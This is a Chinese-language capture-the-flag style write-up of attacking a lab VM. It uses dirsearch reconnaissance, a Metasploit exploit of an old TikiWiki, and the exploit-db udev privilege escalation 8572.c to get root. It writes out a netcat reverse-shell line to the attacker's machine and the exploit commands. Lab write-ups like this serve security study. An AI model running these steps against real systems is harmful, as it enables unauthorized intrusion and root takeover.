话不多说，我们直接开干（我只会一种方法，参考了ch4nge_大哥的文章，鄙人实在是能力有限）。

## 信息收集

首先开启netdiscover发现靶机

    
    
    sudo netdiscover

![1666345295_6352694fc44c70ee9c732.png!small?1666345294066](https://image.3001.net/images/20221021/1666345295_6352694fc44c70ee9c732.png!small?1666345294066)

发现有四个机器，这里的靶机是192.168.100.142，kali机是192.168.100.141

  

这里我们可以进行双扫（dirsearch和nmap),由于这个机器我只用了一种方法，所以只用dirsearch。

### 目录扫描

我安装的是新的kali，本身不带有dirsearch，先进行安装：

    
    
    git clone https://github.com/maurosoria/dirsearch

dirsearch扫描：

    
    
    python3 dirsearch.py -u http://192.168.100.142

内容：

_|. _ _ _ _ _ _|_ v0.4.3

(_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 |
Wordlist size: 11460

Output File:
/root/dirsearch/reports/http_192.168.100.142/_22-10-20_02-20-16.txt

Target: <http://192.168.100.142/>

[02:20:16] Starting:

[02:20:17] 403 - 334B - /.ht_wsr.txt

[02:20:18] 403 - 337B - /.htaccess.bak1

[02:20:18] 403 - 337B - /.htaccess.orig

[02:20:18] 403 - 339B - /.htaccess.sample

[02:20:18] 403 - 338B - /.htaccess_extra

[02:20:18] 403 - 337B - /.htaccess.save

[02:20:18] 403 - 337B - /.htaccess_orig

[02:20:18] 403 - 336B - /.htaccessOLD2

[02:20:18] 403 - 335B - /.htaccess_sc

[02:20:18] 403 - 335B - /.htaccessBAK

[02:20:18] 403 - 335B - /.htaccessOLD

[02:20:18] 403 - 327B - /.htm

[02:20:18] 403 - 328B - /.html

[02:20:18] 403 - 337B - /.htpasswd_test

[02:20:18] 403 - 333B - /.htpasswds

[02:20:18] 403 - 334B - /.httr-oauth

[02:20:28] 403 - 331B - /cgi-bin/

[02:20:31] 403 - 327B - /doc/

[02:20:31] 403 - 342B - /doc/html/index.html

[02:20:31] 403 - 341B - /doc/stable.version

[02:20:31] 403 - 331B - /doc/api/

[02:20:31] 403 - 342B - /doc/en/changes.html

[02:20:41] 200 - 48KB - /phpinfo

[02:20:41] 200 - 48KB - /phpinfo.php

[02:20:46] 403 - 336B - /server-status

[02:20:46] 403 - 337B - /server-status/

[02:20:50] 301 - 361B - /tikiwiki -> <http://192.168.100.142/tikiwiki/>

Task Completed

这里可以看到有个链接<http://192.168.100.142/tikiwiki/>，这个是个cms，点击进入查看版本

![1666345895_63526ba76f1bd2c9a92ec.png!small?1666345893641](https://image.3001.net/images/20221021/1666345895_63526ba76f1bd2c9a92ec.png!small?1666345893641)

复制版本号，到漏洞库去查看（https://www.exploit-db.com/）

![1666345964_63526bece7f9909b43934.png!small?1666345963198](https://image.3001.net/images/20221021/1666345964_63526bece7f9909b43934.png!small?1666345963198)

看到有版本漏洞。

## metasploit利用

![1666346114_63526c828782bda3544bd.png!small?1666346112789](https://image.3001.net/images/20221021/1666346114_63526c828782bda3544bd.png!small?1666346112789)

查看msf是否存在tikiwiki漏洞

![1666346174_63526cbe328a63a6f8398.png!small?1666346172487](https://image.3001.net/images/20221021/1666346174_63526cbe328a63a6f8398.png!small?1666346172487)

利用模块（这里用的是模块5）

![1666346220_63526ceccf2b372bbd08d.png!small?1666346218939](https://image.3001.net/images/20221021/1666346220_63526ceccf2b372bbd08d.png!small?1666346218939)

配置参数：

![1666346274_63526d2296e494303c7ce.png!small?1666346272777](https://image.3001.net/images/20221021/1666346274_63526d2296e494303c7ce.png!small?1666346272777)

展示选项：

![1666346295_63526d3789b10663705f1.png!small?1666346293895](https://image.3001.net/images/20221021/1666346295_63526d3789b10663705f1.png!small?1666346293895)

运行：

![1666346335_63526d5f7aae97f079c05.png!small?1666346334048](https://image.3001.net/images/20221021/1666346335_63526d5f7aae97f079c05.png!small?1666346334048)

查看系统信息：

![1666346366_63526d7e9d2c9cdd3468b.png!small?1666346364842](https://image.3001.net/images/20221021/1666346366_63526d7e9d2c9cdd3468b.png!small?1666346364842)

### 获得交互式shell：

![1666346399_63526d9fb5dc86ba77b6a.png!small?1666346397888](https://image.3001.net/images/20221021/1666346399_63526d9fb5dc86ba77b6a.png!small?1666346397888)

查看python版本信息：

![1666346425_63526db959a52c5fc2fb1.png!small?1666346423498](https://image.3001.net/images/20221021/1666346425_63526db959a52c5fc2fb1.png!small?1666346423498)

获得bash shell

![1666346492_63526dfc7e015c3abf005.png!small?1666346490604](https://image.3001.net/images/20221021/1666346492_63526dfc7e015c3abf005.png!small?1666346490604)

### 搜集系统信息：

id：

![1666346524_63526e1cd0908df63cc5f.png!small?1666346522984](https://image.3001.net/images/20221021/1666346524_63526e1cd0908df63cc5f.png!small?1666346522984)

内核版本：

![1666346537_63526e29d8cd1adecbfee.png!small?1666346536029](https://image.3001.net/images/20221021/1666346537_63526e29d8cd1adecbfee.png!small?1666346536029)

系统版本信息：

![1666346554_63526e3a8a5eee1adf8d5.png!small?1666346552714](https://image.3001.net/images/20221021/1666346554_63526e3a8a5eee1adf8d5.png!small?1666346552714)

## matesploit提权

### 寻找提权囧本：

![1666346607_63526e6f90e02e05b510b.png!small?1666346606131](https://image.3001.net/images/20221021/1666346607_63526e6f90e02e05b510b.png!small?1666346606131)

这里我们使用的是第二个

将第二个payload复制到指定目录（如下）

    
    
    cp /usr/share/exploitdb/exploits/linux/local/8572.c ./
    

![1666346664_63526ea8a1ca9d5b31d68.png!small?1666346662853](https://image.3001.net/images/20221021/1666346664_63526ea8a1ca9d5b31d68.png!small?1666346662853)

此处的.c文件就是提权的囧本

### 靶机下载囧本，攻击机监听

kali机器开启http服务，便于shell使用wget下载.c文件（可以使用crtl+shift+z关闭连接）：

    
    
    python3 -m http.server 80

![1666346819_63526f43bd8181faaae7b.png!small?1666346817932](https://image.3001.net/images/20221021/1666346819_63526f43bd8181faaae7b.png!small?1666346817932)

kali提前开启监听

    
    
    nc -lvvp 8888

![1666346862_63526f6eafbfceb518393.png!small?1666346860837](https://image.3001.net/images/20221021/1666346862_63526f6eafbfceb518393.png!small?1666346860837)

回到msfshell界面，下载.c文件（注意，wget要在/tmp目录下运行）

    
    
    cd /tmp

![1666346954_63526fca273360d83af85.png!small?1666346952367](https://image.3001.net/images/20221021/1666346954_63526fca273360d83af85.png!small?1666346952367)

wget下载文件

![1666346997_63526ff53229e11c7604d.png!small?1666346995344](https://image.3001.net/images/20221021/1666346997_63526ff53229e11c7604d.png!small?1666346995344)

下载完成

编译8572.c文件

    
    
    gcc 8572.c -o ch4nge

![1666347037_6352701d0b52d98f8c6d2.png!small?1666347035176](https://image.3001.net/images/20221021/1666347037_6352701d0b52d98f8c6d2.png!small?1666347035176)

可以看到有个警告，不用理会，不影响运行

编写bash囧本

    
    
    echo '#!/bin/sh' > /tmp/run
    echo 'bin/netcat 192.168.100.141 8888 -e /bin/sh' >> /tmp/run
    

![1666347090_635270529ad2f63b406e7.png!small?1666347088777](https://image.3001.net/images/20221021/1666347090_635270529ad2f63b406e7.png!small?1666347088777)

运行囧本

    
    
    cat run

![1666347133_6352707d60b5e2f6826ab.png!small?1666347131533](https://image.3001.net/images/20221021/1666347133_6352707d60b5e2f6826ab.png!small?1666347131533)

查看运行的PID

    
    
    ps aux | grep udev

![1666347172_635270a4e0514dd3bda4e.png!small?1666347171111](https://image.3001.net/images/20221021/1666347172_635270a4e0514dd3bda4e.png!small?1666347171111)

使用./运行编译的c程序（运行的grep要-1）

    
    
    ./ch4nge 2991

![1666347206_635270c6a610edd4756d5.png!small?1666347204809](https://image.3001.net/images/20221021/1666347206_635270c6a610edd4756d5.png!small?1666347204809)

  

回到监听页面：

![1666347242_635270eaeb0f66616bbab.png!small?1666347241123](https://image.3001.net/images/20221021/1666347242_635270eaeb0f66616bbab.png!small?1666347241123)

查看id权限

![1666347264_6352710085f51cce6c5bf.png!small?1666347262991](https://image.3001.net/images/20221021/1666347264_6352710085f51cce6c5bf.png!small?1666347262991)

![1666347269_63527105de30308e07054.png!small?1666347268097](https://image.3001.net/images/20221021/1666347269_63527105de30308e07054.png!small?1666347268097)

至此为止，获得root权限

